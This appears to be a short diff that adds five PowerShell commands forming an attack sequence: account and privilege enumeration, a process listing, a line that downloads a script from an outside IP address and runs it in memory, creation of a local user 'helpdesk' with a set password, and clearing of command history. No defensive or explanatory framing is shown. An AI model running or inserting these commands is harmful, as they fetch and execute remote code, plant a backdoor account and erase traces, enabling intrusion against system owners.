@@ -1,0 +1,5 @@
+whoami /all
+Get-Process | Select-Object Name
+iwr https://198.51.100.20/p.ps1 | iex
+net user helpdesk Winter2026! /add
+Clear-History
